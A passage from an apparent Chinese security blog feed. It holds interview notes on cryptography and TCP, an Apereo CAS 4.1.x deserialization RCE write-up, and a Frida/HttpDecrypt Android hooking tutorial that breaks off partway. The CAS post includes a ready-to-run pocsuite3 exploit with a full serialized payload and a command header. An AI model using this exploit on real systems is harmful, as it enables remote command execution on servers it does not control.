</p><p>公钥＝(E,N) </p><p>解密: </p><p>明⽂＝密⽂ ^DmodN 私钥＝(D,N)</p><p>三个参数 n,e1,e2 </p><p>n 是两个⼤质数 p,q 的积 </p><p>分组密码的加密模式 </p><p>如何⽣成⼀个安全的随机数？ </p><p>引⽤之前⼀个学⻓的答案，可以通过⼀些物理系统⽣成随机数，如电压的波动、磁盘磁头读 / 写时的寻道时间、空中电磁波的噪声等。 </p><p>SSL 握⼿过程 </p><p>建⽴ TCP 连接、客户端发送 SSL 请求、服务端处理 SSL 请求、客户端发送公共密钥加密过的随机数据、服务端⽤私有 </p><p>密钥解密加密后的随机数据并协商暗号、服务端跟客户端利⽤暗号⽣成加密算法跟密钥 key、之后正常通信。这部分本</p><p>来是忘了的，但是之前看 SSL Pinning 的时候好像记了张图在脑⼦⾥，挣扎半天还是没敢确定，遂放弃。。。</p><p>对称加密与⾮对称加密的不同，分别⽤在哪些⽅⾯ </p><p>6、TCP/IP</p><p>TCP 三次握⼿的过程以及对应的状态转换 </p><p>（1）客户端向服务器端发送⼀个 SYN 包，包含客户端使⽤的端⼝号和初始序列号 x; </p><p>（2）服务器端收到客户端发送来的 SYN 包后，向客户端发送⼀个 SYN 和 ACK 都置位的 TCP 报⽂，包含确认号 xx1 </p><p>和服务器端的初始序列号 y; </p><p>（3）客户端收到服务器端返回的 SYNSACK 报⽂后，向服务器端返回⼀个确认号为 yy1、序号为 xx1 的 ACK 报⽂，⼀</p><p>个标准的 TCP 连接完成。 </p><p>TCP 和 UDP 协议区别 </p><p>tcp ⾯向连接, udp ⾯向报⽂ tcp 对系统资源的要求多 udp 结构简单 tcp 保证数据完整性和顺序，udp 不保证 </p><p>https 的建⽴过程 </p><p>a、客户端发送请求到服务器端 </p><p>b、服务器端返回证书和公开密钥，公开密钥作为证书的⼀部分⽽存在 </p><p>c、客户端验证证书和公开密钥的有效性，如果有效，则⽣成共享密钥并使⽤公开密钥加密发送到服务器端 </p><p>d、服务器端使⽤私有密钥解密数据，并使⽤收到的共享密钥加密数据，发送到客户端 </p><p>e、客户端使⽤共享密钥解密数据</p><p>f SSL 加密建⽴f、SSL 加密建⽴ </p><p>7、流量分析 </p><p>wireshark 简单的过滤规则 </p><p>过滤 ip: </p><p>过滤源 ip 地址: ip.src==1.1.1.1; , ⽬的 ip 地址: ip.dst==1.1.1.1;</p><p>过滤端⼝: </p><p>过滤 80 端⼝: tcp.port==80 , 源端⼝: tcp.srcport==80 , ⽬的端⼝: tcp.dstport==80</p><p>协议过滤: </p><p>直接输⼊协议名即可, 如 http 协议 http</p><p>http 模式过滤: </p><p>过滤 get/post 包 http.request.mothod==”GET/POST”</p><p>8、防⽕墙 </p><p>简述路由器交换机、防⽕墙等⽹络设备常⽤的⼏个基础配置加固项，以及配置⽅法。</p><p>转自：</p><p><a href="https://github.com/Mr-xn/BurpSuite-collections">https://github.com/Mr-xn/BurpSuite-collections</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;⽹上整理的⾯试问题⼤全，有些 HW ⾯试的题，已经收集好了，提供给⼤家。现在就是毕业季节，希望各位都能找到好⼯作。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;渗透篇&quot;&gt;&lt;a href=&quot;#渗透篇&quot; class=&quot;headerlink&quot; t
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="面试" scheme="http://www.ol4three.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Apereo Cas 4.1.x 反序列化命令执行漏洞</title>
    <link href="http://www.ol4three.com/2020/12/29/WEB/Exploit/Apereo-cas/Apereo-Cas-4-1-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.ol4three.com/2020/12/29/WEB/Exploit/Apereo-cas/Apereo-Cas-4-1-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-12-29T11:34:42.000Z</published>
    <updated>2020-12-30T03:19:03.360Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><blockquote><p>Apereo CAS 是一款 Apereo 发布的集中认证服务平台，常被用于企业内部单点登录系统。其 4.1.7 版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。</p></blockquote><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>其实这个洞在2016年时候就出来了，Apereo Cas一般是用来做身份认证的，所以有一定的攻击面，漏洞的成因是因为key的默认硬编码，导致可以通过反序列化配合Gadget使用。</p><p>漏洞原理实际上是 Webflow 中使用了默认密钥 <code>changeit</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class EncryptedTranscoder implements Transcoder &#123;</span><br><span class="line">    private CipherBean cipherBean;</span><br><span class="line">    private boolean compression &#x3D; true;</span><br><span class="line"></span><br><span class="line">    public EncryptedTranscoder() throws IOException &#123;</span><br><span class="line">        BufferedBlockCipherBean bufferedBlockCipherBean &#x3D; new BufferedBlockCipherBean();</span><br><span class="line">        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec(&quot;AES&quot;, &quot;CBC&quot;, &quot;PKCS7&quot;));</span><br><span class="line">        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());</span><br><span class="line">        bufferedBlockCipherBean.setKeyAlias(&quot;aes128&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setKeyPassword(&quot;changeit&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setNonce(new RBGNonce());</span><br><span class="line">        this.setCipherBean(bufferedBlockCipherBean);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>工具下载地址：</p><p><a href="https://github.com/MrMeizhi/ysoserial-mangguogan">https://github.com/MrMeizhi/ysoserial-mangguogan</a></p><p>命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-managguogan-0.0.1-SNAPSHOT-all.jar encode CommonCollections4</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229195402286.png" alt="image-20201229195402286"></p><p>将该payload替换至execution处，并在头部添加命令cmd:xxx</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229203354148.png" alt="image-20201229203354148"></p><h2 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">from collections import OrderedDict</span><br><span class="line">from pocsuite3.api import Output, POCBase, OptString, register_poc, requests</span><br><span class="line"></span><br><span class="line">class ApereoPoc(POCBase):</span><br><span class="line">vulID &#x3D; &#39;004&#39;</span><br><span class="line">version &#x3D; &#39;1.0&#39;</span><br><span class="line">author &#x3D; [&#39;ol4three&#39;]</span><br><span class="line">vulDate &#x3D; &#39;2020-12-29&#39;</span><br><span class="line">updateDate &#x3D; &#39;2020-12-29&#39;</span><br><span class="line">references &#x3D; [&#39;https:&#x2F;&#x2F;github.com&#x2F;MrMeizhi&#x2F;ysoserial-mangguogan&#39;]</span><br><span class="line">name &#x3D; &#39;appereo 4.1rce&#39;</span><br><span class="line">appPowerLink &#x3D; &#39;https:&#x2F;&#x2F;www.appareo.com&#x2F;&#39;</span><br><span class="line">appName &#x3D; &#39;Appereo&#39;</span><br><span class="line">appVersion &#x3D; &#39;4.1&#39;</span><br><span class="line">vulType &#x3D; &#39;rce&#39;</span><br><span class="line">desc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> rce</span><br><span class="line"> &#39;&#39;&#39;</span><br><span class="line">pocDesc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> pocsuite -r ***.py -u target --verify&quot;</span><br><span class="line"> &#39;&#39;&#39;</span><br><span class="line">samples &#x3D; []</span><br><span class="line">install_requires &#x3D; []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def _options(self):</span><br><span class="line">o &#x3D; OrderedDict()</span><br><span class="line">o[&quot;exec&quot;] &#x3D; OptString(&#39;&#39;, description&#x3D;&#39;请输入想要执行的命令&#39;, require&#x3D;True)</span><br><span class="line">return o</span><br><span class="line"></span><br><span class="line">def _verify(self):</span><br><span class="line">result &#x3D; &#123;&#125;</span><br><span class="line">payload &#x3D; self.get_option(&quot;exec&quot;)</span><br><span class="line">url &#x3D; self.url + &#39;&#x2F;cas&#x2F;login&#39;</span><br><span class="line">headers&#x3D;&#123;</span><br><span class="line">&#39;Content-Type&#39;:  &#39;application&#x2F;x-www-form-urlencoded&#39;,</span><br><span class="line">&#39;cmd&#39;: payload</span><br><span class="line">&#125;</span><br><span class="line">#proxies&#x3D;&#123;</span><br><span class="line"># &#39;http&#39;:&#39;127.0.0.1:8081&#39;,</span><br><span class="line"># &#39;https&#39;:&#39;127.0.0.1:8081&#39;</span><br><span class="line"># &#125;</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">&#39;execution&#39;:&#39;4c2e04cc-36fd-4a78-a539-ab98a65ff427_AAAAIgAAABC0ugdUC3wVTL66CTpSSFXfAAAABmFlczEyOCCbvgOC7&#x2F;mJ16k1YEqnbb4iYkkhNuWylo+cCiG7vsHQWc4OudDgqLtgaCEzQj8c&#x2F;3tWkVDKryIJFcjdW64IpJ1+ymxDamhIfoF3oCFkBD6LGjmB31YH6zlT1rFN9&#x2F;7CFeKORHALeLVx2YAN4seko9M&#x2F;javUOs7UE+zzLGonjc54xjK7S64KBw52Fa0vj912zrOP4J6S7Vi9yJOeOTx432Or&#x2F;cjz722nEAIpjpcIIawwRdUcCyZY7bJDhR+QL7Ca3h9lPZ1LIAeIe9CDP0PCQDAONZ0rswQ9AitIDlqM+lBDKtqhPfHSNq8jBd5T6t3&#x2F;9xXFpPIbLpUPiwysE&#x2F;yioU8b&#x2F;npQfATy5UZvf3d2TWtHiEEhECGjOS4zZqqhl5HhBK3lw50JoO&#x2F;78RMscuM+3oAF8r9YJq2vrY+2GNwgg5rMIWtodeQL9gEIABKMy2Isetinvnc05Dj5f9kJ7WXSIrEobqYmSf1RaSM7EO8yuXS7kVUvY1+TYBorC8JYhY6owsUm4jNSKlvVX+PkrwcQXOJH3lpVpN4qZ&#x2F;GTNJkNO0ndWRlWgoHDKxI0+Jr6+k2CzlPgOhCiQq08nldByD4VOFJ1Fcjj4XFxlWI2MWxsMYTj9YdHwozA4gZNE8gkMq0tn8lwnJz6gVvSXWkDKnxJBPT3kEw1b+wjZSBsuj+JCdxCIa+lZopdPWIO40ITA2245p1U9i9srkCJ&#x2F;od122lzrrCALs+FKn1&#x2F;uwQs9FKXxH8xKwgpUmZepCX6Lf+qr8m9xQ&#x2F;XmoxSh1Sg0hkZcw0bh30mdZvUH9Jf&#x2F;bEdgVxuAB1Ki1Y5&#x2F;flDS4HkjydACMm+Pg5SzcRHZtavv+t5ko&#x2F;tTIjwyqug9jOZWMnKDq47nD&#x2F;qOvuO0TS&#x2F;COeDMmPGV4stx6+5+6kXtP088MQVRBLdlVsGrolnPVgQG9JPgfMOZKoyidBDH99oy1WWivT2Y2LDnFx4MXeuEHR3qnuWHkYxfaysVCM83yMd4eqvLBHp4ILBf4mmv34S25T7ajkOKfIDXJZc7AhzlkfPzufCSIVdYNPvRxijLpJV2icYs7KQXx98EXXwOAw+wXJAKEbEXv&#x2F;gErjwUQUXVactxFVqlkugxj1u052N9gh620Nz+54c5FF8vHaBtHVNtB48bnB1NGCL098EDHFnI9L&#x2F;trqp2LPw6veXtH0y6TT&#x2F;l+sALyQ6P167qrc6lQ8gclh5tEg4Cuz2jbG56pmY+5Zj6RHNFeZeDDXpYrJ5g2Bxn4AcPW3lM4Vpnzoypzcs4ktZRL0deQNMis53i5O0C96ZBQjYqfPqCtr7zS7KZXRfJSmmv0hcWZINv0S2+7SzFCrRyMW0ykJ4reuwlm1ZAG2W5RZNzMOH&#x2F;76N2ITAQxFHG228typOvHAuXG2pB5xYMwtm9ZysqQvzGNMspuu0CaDkCV7myKMAtCfGJTVRV7xs1slSmYnwTg3SdoJ+0ZJfOOsyFsZYqii2RTixQKykc4Uo3fyLb9dFe6Kd7vpkK&#x2F;47MrOmzVBS1Xv1cHGCeM7K4Yca0&#x2F;oJL&#x2F;Dhbwfqt4hIKbhiTccek5mco&#x2F;hywqizyY2C3UVieQxOX1CYfrjnihEJ75lBQjkaRqB3S05vzzfyTPvv55QfYQMyMODdgvNEt9PIQ6axHv1DxYeVhUAd10p1n01SQIdbAi+1WE3ykGgyrLSul1gFRlI&#x2F;3STqelXFWbYiZarKdfgvvV1r&#x2F;HQ6ZErUagAdmmaJUSgjzRSEgA3Sk&#x2F;V5PMrISxxYVbTVm&#x2F;vq1Zla7BaUstxiclygOuvZ3C2AfxS+AVaTeqOWCqXrjeg6uxOJIUQ1HzS&#x2F;Vs5EbYmkcRHWCjJRTjh&#x2F;Sa0GDP&#x2F;Giuw5CL8BEDo7SKuYqVYOIf5hk0Upj4YcRWouOhbbJY9mNNWHknoiYRJHTrVDrRwYYO1Ij8Vf8jiWmXxRWZ8tyFuEB3yX0SkVgw5OlU1M24d7x1LZYpZX6vpU1qrDme1yrGW4FS4qBg3lE1r9EK2gzQeT1u5GhME2rotGVNU4OZ&#x2F;Ut3mKpY5NOo3b2yHoa1iIdE+Sg9uerfNPV59u00En&#x2F;I2MHTtl8JGZp3SXTtoxG8YBC4CU7JXdSzmSF8nHD0SGUL&#x2F;LNdajIzH9hfijUX6I5NxEMyumX&#x2F;krUBqW0irEWYV7I60YDRzN&#x2F;LpXe9EQj5chLmXlRcQU49vlxSHav3YFHrnGFFzyGxwU&#x2F;6RDiWIt4ombAl&#x2F;&#x2F;OsWR964unMMsU+omndBNBII&#x2F;1g1kSs1qikjqdNm611p8swjK3X7kpGCj5rUyTE9GOAkBD6NYrj32SNE5BPys7u6r3Q7gx&#x2F;hU1s02trClHoQhqQvKILW8dN7aYcWSf5FV8fug3GjAxV+c3pTYiNbe2lKFLbzyeJen1GvkAVXVrpJqtuPejZK6IPiJ8wI7ZwqL7oP5G3Esu9Z6syxrdqMGmhpOA0QE0NPISgMu6TzZxgt3FGAkV9&#x2F;hH9ABc&#x2F;h4QMMkUOgZPMddyYBugpcaG0NTgU7WXZNuz1hQEqsW+rcXVhF30uydTnF2mhJ0UrmQVMg+qlaGBQOVJuar9ud+D+CAYT2a2tjUluhWj284EjM5yNg3A5nNQthCowUy7bfsjbp82Yb8p9l86ETHZo26WmUe2k+beZPGOtF00QZcQaRYowr2B8+0OMFuhmGzWtJqlWgGXAmtcWFPyDgnHWwjj&#x2F;bTyqzVfnrBpiKf1SiUdRbrvyr8hjrWQ&#x2F;wZ52No1qkQmLo1x9sfEcBKHOxakYWb6vjbcPQekorRn4NS4WT3KU&#x2F;ftAhxg2EITy2Lq1Y&#x3D;&#39;</span><br><span class="line">&#125;</span><br><span class="line">r &#x3D; requests.post(url, headers&#x3D;headers,data&#x3D;data)</span><br><span class="line">if r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">result[&#39;VerifyInfo&#39;] &#x3D; &#123;&#125;</span><br><span class="line">result[&#39;VerifyInfo&#39;][&#39;URL&#39;] &#x3D; url</span><br><span class="line">result[&#39;VerifyInfo&#39;][&#39;exec&#39;] &#x3D; r.text</span><br><span class="line">return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">def parse_output(self, result):</span><br><span class="line"> output &#x3D; Output(self)</span><br><span class="line"> if result:</span><br><span class="line"> output.success(result)</span><br><span class="line"> else:</span><br><span class="line"> output.fail(&#39;target is not vulnerable&#39;)</span><br><span class="line"> return output</span><br><span class="line"></span><br><span class="line">def _attack(self):</span><br><span class="line">return self._verify()</span><br><span class="line">register_poc(ApereoPoc)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229210459731.png" alt="image-20201229210459731"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/8260#toc-4">https://xz.aliyun.com/t/8260#toc-4</a></p><p><a href="https://github.com/MrMeizhi/ysoserial-mangguogan">https://github.com/MrMeizhi/ysoserial-mangguogan</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概要&quot;&gt;&lt;a href=&quot;#概要&quot; class=&quot;headerlink&quot; title=&quot;概要&quot;&gt;&lt;/a&gt;概要&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Apereo CAS 是一款 Apereo 发布的集中认证服务平台，常被用于企业内部单点登录系统。其 4.1.7 
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Apereo Cas" scheme="http://www.ol4three.com/tags/Apereo-Cas/"/>
    
  </entry>
  
  <entry>
    <title>使用Httpdecrypt进行hook</title>
    <link href="http://www.ol4three.com/2020/12/29/Android/%E4%BD%BF%E7%94%A8Httpdecrypt%E8%BF%9B%E8%A1%8CHOOK/"/>
    <id>http://www.ol4three.com/2020/12/29/Android/%E4%BD%BF%E7%94%A8Httpdecrypt%E8%BF%9B%E8%A1%8CHOOK/</id>
    <published>2020-12-29T03:57:33.000Z</published>
    <updated>2020-12-29T08:13:26.048Z</updated>
    
    <content type="html"><![CDATA[<h2 id="本机环境"><a href="#本机环境" class="headerlink" title="本机环境"></a>本机环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.mumu模拟器</span><br><span class="line">2.httpdecrypt（https:&#x2F;&#x2F;github.com&#x2F;lyxhh&#x2F;lxhToolHTTPDecrypt）</span><br><span class="line">3.frida 12.11.17</span><br><span class="line">4.Mac os 10.15.5</span><br></pre></td></tr></table></figure><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><h3 id="1-使用mumu模拟器连接adb"><a href="#1-使用mumu模拟器连接adb" class="headerlink" title="1. 使用mumu模拟器连接adb"></a>1. 使用mumu模拟器连接adb</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb kill-server &amp;&amp; adb server &amp;&amp; adb shell</span><br></pre></td></tr></table></figure><p>安装时使用4.3.2版本 5.0版本报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The client is using an unsupported version of the Socket.IO or Engine.IO protocols</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask-socketio&#x3D;&#x3D;4.3.2</span><br></pre></td></tr></table></figure><h3 id="2-对注册功能抓包"><a href="#2-对注册功能抓包" class="headerlink" title="2. 对注册功能抓包"></a>2. 对注册功能抓包</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229120510857.png" alt="image-20201229120510857"></p><p>可以看到securityCode以及post内容均为加密内容</p><h3 id="3-运行httpdecrypt"><a href="#3-运行httpdecrypt" class="headerlink" title="3. 运行httpdecrypt"></a>3. 运行httpdecrypt</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229120648649.png" alt="image-20201229120648649"></p><p>找到目标app 将app包名com.xxx.xxx填入框中并点击Confirm</p><h3 id="4-然后点击Hooks功能"><a href="#4-然后点击Hooks功能" class="headerlink" title="4. 然后点击Hooks功能"></a>4. 然后点击Hooks功能</h3><p>在Match中输入刚才的包名 点击Confirm</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229121019274.png" alt="image-20201229121019274"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229121218308.png" alt="image-20201229121218308"></p><h3 id="5-重新进行注册功能操作"><a href="#5-重新进行注册功能操作" class="headerlink" title="5. 重新进行注册功能操作"></a>5. 重新进行注册功能操作</h3><p>根据数据包中的参数，找到对应的方法</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229145006899.png" alt="image-20201229145006899"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES.encrypt(argType0 : object argType1 : string)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229145315814.png" alt="image-20201229145315814"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool.EncoderByMd5(argType0 : string)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229145518763.png" alt="image-20201229145518763"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES.decrypt(argType0 : object argType1 : string)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="6-查看加密函数"><a href="#6-查看加密函数" class="headerlink" title="6. 查看加密函数"></a>6. 查看加密函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES.encrypt(argType0 : object argType1 : string)</span><br></pre></td></tr></table></figure><p>有两个参数 一个是<strong>对象</strong> 一个是<strong>字符串</strong> 我们还需要知道对象的具体的参数类型</p><p>在Finds中搜索函数的类名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.xxx.xxx.ybblibrary.comm.commTools.tool</span><br></pre></td></tr></table></figure><ul><li>点击Confirm</li><li>找到方法名EncryptionTool$AES encrypt</li><li>可以看到其具体的参数类型</li></ul><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229145750559.png" alt="image-20201229145750559"></p><p>加密函数中参数对象的具体的类型为static</p><h2 id="代码生成"><a href="#代码生成" class="headerlink" title="代码生成"></a>代码生成</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229145856477.png" alt="image-20201229145856477" style="zoom:50%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.转到toBurp模块</span><br><span class="line">2.然后点击Confirm</span><br><span class="line">3.点击add</span><br><span class="line">由于这个加密函数有两个参数 所以需要自己编辑代码（默认只有一个参数）</span><br><span class="line">4.由于对象参数是static类型 所以选择static类型</span><br><span class="line">动态的选择instance类型</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229150310913.png" alt="image-20201229150310913"></p><h3 id="1-在custom中会生成代码"><a href="#1-在custom中会生成代码" class="headerlink" title="1. 在custom中会生成代码"></a>1. 在custom中会生成代码</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229153322897.png" alt="image-20201229153322897"></p><p>arg0是传过来的加密字符串 arg1是Android的Context的对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var context &#x3D; Java.use(&#39;android.app.ActivityThread&#39;).currentApplication().getApplicationContext();</span><br></pre></td></tr></table></figure><p>最终代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">var rpc_result &#x3D; null;</span><br><span class="line">var rpc_result_ios &#x3D; null;</span><br><span class="line">rpc.exports &#x3D; &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tagf0f1c91ca14d835ab8ae6e62346a447d02: function(arg0, arg1)&#123;</span><br><span class="line">        Java.perform(function () &#123;</span><br><span class="line">            try&#123;</span><br><span class="line">var context &#x3D; Java.use(&#39;android.app.ActivityThread&#39;).currentApplication().getApplicationContext();</span><br><span class="line">                var EncryptionTool$AES0224190b5b0f850f45017089f29e6428 &#x3D; Java.use(&quot;com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES&quot;);</span><br><span class="line">                rpc_result &#x3D; EncryptionTool$AES0224190b5b0f850f45017089f29e6428.decrypt(context,arg0);</span><br><span class="line">                &#x2F;&#x2F; send(JSON.stringify(&#123;&quot;aa&quot;:&quot;bb&quot;,&quot;aa1&quot;:&quot;bbb&quot;&#125;)+&#39;-cusoto0oom0sc0ri0pt-&#39;)</span><br><span class="line">            &#125;catch(e)&#123;send(&quot;tagf0f1c91ca14d835ab8ae6e62346a447d02, &quot; + e + &quot;-er00roo000r-&quot;)&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        return rpc_result;</span><br><span class="line">    &#125;,</span><br><span class="line">&#x2F;&#x2F; Added Function </span><br><span class="line">tag24239e10fd5afd01a5459978c4306b1f02: function(arg0, arg1)&#123;</span><br><span class="line">        Java.perform(function () &#123;</span><br><span class="line">            try&#123;</span><br><span class="line">var context &#x3D; Java.use(&#39;android.app.ActivityThread&#39;).currentApplication().getApplicationContext();</span><br><span class="line">                var EncryptionTool$AES2b8ecc9bd5061994b912287f6411ac57 &#x3D; Java.use(&quot;com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES&quot;);</span><br><span class="line">                rpc_result &#x3D; EncryptionTool$AES2b8ecc9bd5061994b912287f6411ac57.encrypt(context,arg0);</span><br><span class="line">                &#x2F;&#x2F; send(JSON.stringify(&#123;&quot;aa&quot;:&quot;bb&quot;,&quot;aa1&quot;:&quot;bbb&quot;&#125;)+&#39;-cusoto0oom0sc0ri0pt-&#39;)</span><br><span class="line">            &#125;catch(e)&#123;send(&quot;tag24239e10fd5afd01a5459978c4306b1f02, &quot; + e + &quot;-er00roo000r-&quot;)&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        return rpc_result;</span><br><span class="line">    &#125;,</span><br><span class="line">&#x2F;&#x2F; Added Function </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-loadScript"><a href="#2-loadScript" class="headerlink" title="2.loadScript"></a>2.loadScript</h3><p>点击左上角loadScript</p><h3 id="3-在burpsutie中进行设置"><a href="#3-在burpsutie中进行设置" class="headerlink" 